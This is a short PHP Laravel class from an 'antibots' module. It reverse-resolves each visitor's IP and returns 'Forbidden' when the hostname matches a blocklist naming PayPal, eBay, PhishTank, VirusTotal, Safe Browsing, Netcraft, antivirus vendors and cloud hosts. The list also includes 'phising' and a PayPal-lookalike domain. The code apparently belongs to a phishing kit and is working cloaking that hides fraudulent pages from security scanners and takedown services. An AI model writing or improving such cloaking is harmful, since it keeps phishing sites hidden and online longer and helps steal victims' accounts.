<?php

namespace App\Services\Antibots\Rules\Guard;

class BlockHn
{
    public function run()
    {
        $ip = request()->ip();
        $userAgent = request()->userAgent();

        if (!$ip) {
            return;
        }

        $hostname = gethostbyaddr($ip);

        $blockedWords = [
            "above", "google", "softlayer", "amazonaws","cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute",
            "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers",
            "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "BitDefender", "mcafee", "antivirus",
            "cloudflare", "avg", "avira", "avast", "ovh.net", "security", "twitter", "bitdefender", "virustotal",
            "phising", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro",
            "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "vultr",
            "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", "cymru.com", "sl-reverse.com",
            "surriel.com", "hosting", "orange-labs", "speedtravel", "metauri", "apple.com", "bruuk.sk", "sysms.net",
            "oracle", "cisco", "amuri.net", "versanet.de", "hilfe-veripayed.com"
        ];

        foreach ($blockedWords as $word) {
            if (stripos($hostname, $word) !== false) {
                $this->logDetection($ip, $userAgent);
                abort(403, 'Forbidden');
            }
        }
    }

    public function logDetection(string $ip, string $userAgent): void
    {
        // Guardar en archivo bloqueados.log
        file_put_contents(
            storage_path('logs/resultados/bloqueados.log'),
            "BLOQUEADO POR HOSTNAME || user-agent: $userAgent\nIP: $ip || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "\n\n",
            FILE_APPEND
        );

        // Registrar IP en resultado_total.log
        file_put_contents(
            storage_path('logs/resultados/resultado_total.log'),
            "$ip (Detectado por HOSTNAME)\n",
            FILE_APPEND
        );
    }
}
